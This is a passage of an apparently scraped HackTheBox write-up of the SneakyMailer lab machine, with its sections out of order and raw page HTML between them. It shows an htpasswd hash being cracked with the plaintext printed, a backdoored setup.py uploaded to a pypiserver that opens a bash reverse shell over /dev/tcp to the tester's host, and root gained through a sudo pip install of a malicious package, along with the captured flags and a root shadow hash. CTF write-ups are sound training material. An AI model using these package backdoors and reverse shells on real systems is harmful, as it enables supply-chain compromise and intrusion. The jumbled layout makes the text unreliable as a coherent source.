/var/www/pypi.sneakycorp.htb total 12K -rw-r--r-- 1 root root 43 May 15 14:29 .htpasswd drwxrwx--- 2 root pypi-pkg 4.0K Nov 9 12:19 packages drwxr-xr-x 6 root pypi 4.0K May 14 18:25 venv We can check the hash:\n1 2 cat /var/www/pypi.sneakycorp.htb/.htpasswd pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/ Let’s see the kind of hash:\n1 2 3 $ haiti '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/' MD5(APR) [HC: 1600] Apache MD5 [HC: 1600] 1 2 3 4 5 6 7 8 9 $ john hash.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=md5crypt Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status soufianeelhaoui (pypi) 1g 0:00:00:27 DONE (2020-11-09 21:36) 0.03652g/s 130543p/s 130543c/s 130543C/s souhegan..souderton0 Use the \"--show\" option to display all of the cracked passwords reliably Session complete Let’s add the new sub-domain to /etc/hosts.\n1 2 $ cat /etc/hosts | grep sneak 10.10.10.197 sneakycorp.htb dev.sneakycorp.htb pypi.sneakycorp.htb On port 80 we have the same website as for sneakycorp.htb but on port 8080 we can see an app called pypiserver. (http://pypi.sneakycorp.htb:8080/)\nWelcome to pypiserver!\nThis is a PyPI compatible package index serving 0 packages.\nTo use this server with pip, run the following command:\npip install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...] To use this server with easy_install, run the following command:\neasy_install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE [PACKAGE2...] The complete list of all packages can be found here or via the simple index.\nThis instance is running version 1.3.2 of the pypiserver software.\nWe can connect to the package index () basic auth with the cracked credentials pypi / soufianeelhaoui.\nBut no package is indexed yet.\nRTFM. Letr’s read the Uploading Packages Remotely page of pypiserver documentation.\nThe first thing we will need to upload a package is ~/.pypirc.\n1 2 3 4 5 6 7 [distutils] index-servers = local [local] repository: http://pypi.sneakycorp.htb:8080/ username: pypi password: soufianeelhaoui And of course we will need setup.py for setuptools.\nLet’s look at the Minimal Structure required:\n1 2 3 4 cyfun/ cyfun/ __init__.py setup.py setup.py\n1 2 3 4 5 6 7 8 9 10 11 from setuptools import setup setup(name='cyfun', version='0.1', description='cyfun de mon pwnage', url='https://pwn.by/cyfun', author='cyfun', author_email='cyfun@example.com', license='MIT', packages=['cyfun'], zip_safe=False) Let’s run python setup.py sdist upload -r local to package it and upload it.\nThen we can see the package cyfun indexed and removed a few seconds later. Let’s add a backdoor in the package.\n1 2 3 4 5 6 7 8 9 10 11 12 13 from setuptools import setup import os os.system(\"echo 'bash -i \u003e\u0026/dev/tcp/10.10.14.174/8080 0\u003e\u00261' | /bin/bash\") setup(name='cyfun', version='0.1', description='cyfun de mon pwnage', url='https://pwn.by/cyfun', author='cyfun', author_email='cyfun@example.com', license='MIT', packages=['cyfun'], zip_safe=False) Here we got a shell as low:\n1 2 3 4 5 6 $ low@sneakymailer:~$ id uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) ,111(bluetooth),119(pypi-pkg) low@sneakymailer:~$ cat user.txt 70ac4f2e6be3aece2eed49ecb6f80d7d Privilege Escalation of Machine : from low to root 1 2 $ printf %s 'ssh-rsa cyfun@penarch' \u003e\u003e ~/.ssh/authorized_keys $ ssh -i ~/.ssh/id_rsa low@10.10.10.197 Let’s look for low hanging fruits:\n1 2 3 4 5 6 7 low@sneakymailer:~$ sudo -l sudo: unable to resolve host sneakymailer: Temporary failure in name resolution Matching Defaults entries for low on sneakymailer: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User low may run the following commands on sneakymailer: (root) NOPASSWD: /usr/bin/pip Let’s create a very minimal backdoored package:\n1 2 3 4 5 low@sneakymailer:~$ mktemp -d /tmp/tmp.lIuPOXEbwZ low@sneakymailer:~$ cd /tmp/tmp.lIuPOXEbwZ low@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ vim.tiny setup.py low@sneakymailer:/tmp/tmp.lIuPOXEbwZ$ sudo /usr/bin/pip3 install setup.py\n1 2 import os os.system(\"echo 'bash -i \u003e\u0026/dev/tcp/10.10.14.174/8080 0\u003e\u00261' | /bin/bash\") When executed we retrieve the root shell:\n1 2 3 4 5 6 7 root@sneakymailer:/tmp/pip-req-build-lp_bvi48# id uid=0(root) gid=0(root) groups=0(root) root@sneakymailer:/tmp/pip-req-build-lp_bvi48# cd root@sneakymailer:~# cat root.txt 602b7d042c33e19fdf079cfef493eb60 root@sneakymailer:~# cat /etc/shadow | grep root root:$6$jJW2Iy0Knfw7c6gr$/p2MAEhr7Fy4bMIT8szzgnSkL2kp8EaPKvGQ//cfcX0bMnazYHzNwWIsGaGwgceFyftI2Xihj0rrhUbfkrzhf.:18402:0:99999:7::: ","wordCount":"3720","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/sneakymailer/sneakymailer.png","datePublished":"2020-11-28T13:47:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/sneakymailer/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">SneakyMailer</h1><div class=post-description>SneakyMailer HackTheBox writeup</div><div class=post-meta><span title='2020-11-28 13:47:00 +0000 UTC'>November 28, 2020</span>&nbsp;·&nbsp;18 min&nbsp;·&nbsp;3720 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/medium/ class=post-tag title=medium>medium</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/sneakymailer/sneakymailer.png alt="SneakyMailer HackTheBox Machine"><p>SneakyMailer - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#service-discovery>Service discovery</a></li><li><a href=#smtp--imap-exploitation>SMTP & IMAP exploitation</a></li><li><a href=#ftp-access>FTP access</a></li><li><a href=#privilege-escalation-of-machine--from-www-data-to-developer>Privilege Escalation of Machine : from www-data to developer</a></li><li><a href=#privilege-escalation-of-machine--from-developer-to-low>Privilege Escalation of Machine : from developer to low</a></li><li><a href=#privilege-escalation-of-machine--from-low-to-root>Privilege Escalation of Machine : from low to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> SneakyMailer</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/262>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pacman -S nmap ffuf lynx ruby ruby-nokogiri swaks pwncat evolution filezilla
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port & service discovery with <a href=https://nmap.org/>nmap</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Sun Nov  8 16:50:55 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.197
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.197
</span></span><span class=line><span class=cl>Host is up (0.022s latency).
</span></span><span class=line><span class=cl>Not shown: 65528 closed ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>21/tcp   open  ftp      vsftpd 3.0.3
</span></span><span class=line><span class=cl>22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
</span></span><span class=line><span class=cl>|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
</span></span><span class=line><span class=cl>25/tcp   open  smtp     Postfix smtpd
</span></span><span class=line><span class=cl>|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
</span></span><span class=line><span class=cl>80/tcp   open  http     nginx 1.14.2
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.14.2
</span></span><span class=line><span class=cl>|_http-title: Did not follow redirect to http://sneakycorp.htb
</span></span><span class=line><span class=cl>143/tcp  open  imap     Courier Imapd (released 2018)
</span></span><span class=line><span class=cl>|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS STARTTLS completed ACL CHILDREN UTF8=ACCEPTA0001 NAMESPACE OK QUOTA CAPABILITY
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
</span></span><span class=line><span class=cl>| Subject Alternative Name: email:postmaster@example.com
</span></span><span class=line><span class=cl>| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 3072
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2020-05-14T17:14:21
</span></span><span class=line><span class=cl>| Not valid after:  2021-05-14T17:14:21
</span></span><span class=line><span class=cl>| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
</span></span><span class=line><span class=cl>|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
</span></span><span class=line><span class=cl>|_ssl-date: TLS randomness does not represent time
</span></span><span class=line><span class=cl>993/tcp  open  ssl/imap Courier Imapd (released 2018)
</span></span><span class=line><span class=cl>|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS completed ACL CHILDREN UTF8=ACCEPTA0001 AUTH=PLAIN NAMESPACE OK QUOTA CAPABILITY
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
</span></span><span class=line><span class=cl>| Subject Alternative Name: email:postmaster@example.com
</span></span><span class=line><span class=cl>| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 3072
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2020-05-14T17:14:21
</span></span><span class=line><span class=cl>| Not valid after:  2021-05-14T17:14:21
</span></span><span class=line><span class=cl>| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
</span></span><span class=line><span class=cl>|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
</span></span><span class=line><span class=cl>|_ssl-date: TLS randomness does not represent time
</span></span><span class=line><span class=cl>8080/tcp open  http     nginx 1.14.2
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD
</span></span><span class=line><span class=cl>|_http-open-proxy: Proxy might be redirecting requests
</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.14.2
</span></span><span class=line><span class=cl>|_http-title: Welcome to nginx!
</span></span><span class=line><span class=cl>Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Sun Nov  8 16:51:55 2020 -- 1 IP address (1 host up) scanned in 60.40 seconds
</span></span></code></pre></td></tr></table></div></div><p>We can see there is a redirect from the web server on port 80 to <a href=http://sneakycorp.htb>http://sneakycorp.htb</a>,
so let&rsquo;s add this local domain to <code>/etc/hosts</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep sneak
</span></span><span class=line><span class=cl>10.10.10.197 sneakycorp.htb
</span></span></code></pre></td></tr></table></div></div><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>Let&rsquo;s see if we can find links:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ lynx -dump -listonly -nonumbers http://sneakycorp.htb/
</span></span><span class=line><span class=cl>   Visible links:
</span></span><span class=line><span class=cl>http://sneakycorp.htb/index.php
</span></span><span class=line><span class=cl>http://sneakycorp.htb/team.php
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Hidden links:
</span></span><span class=line><span class=cl>http://sneakycorp.htb/index.php
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/
</span></span><span class=line><span class=cl>http://sneakycorp.htb/#page-top
</span></span></code></pre></td></tr></table></div></div><p>Nothing useful, maybe the team page if we have a bruteforce to perform later.</p><p>Now we can try to find some sub-domains:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>H</span> <span class=s1>&#39;Host: FUZZ.sneakycorp.htb&#39;</span> <span class=o>-</span><span class=n>ac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Header</span>           <span class=p>:</span> <span class=n>Host</span><span class=p>:</span> <span class=n>FUZZ</span><span class=o>.</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>size</span><span class=p>:</span> <span class=mi>185</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>words</span><span class=p>:</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>lines</span><span class=p>:</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dev</span>                     <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>13737</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>4007</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>341</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>38267</span><span class=o>/</span><span class=mi>38267</span><span class=p>]</span> <span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>1807</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>22</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>We can add <code>dev.sneakycorp.htb</code> to <code>/etc/hosts</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep sneak
</span></span><span class=line><span class=cl>10.10.10.197 sneakycorp.htb dev.sneakycorp.htb
</span></span></code></pre></td></tr></table></div></div><p>The dev site looks the same but there is an additional page:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ lynx -dump -listonly -nonumbers http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>   Visible links:
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/index.php
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/team.php
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/pypi/register.php
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Hidden links:
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/index.php
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/
</span></span><span class=line><span class=cl>http://dev.sneakycorp.htb/#page-top
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try to register an account at <a href=http://dev.sneakycorp.htb/pypi/register.php>http://dev.sneakycorp.htb/pypi/register.php</a></p><p>We don&rsquo;t know if it&rsquo;s working or if it&rsquo;s a rabbit hole and there is no login
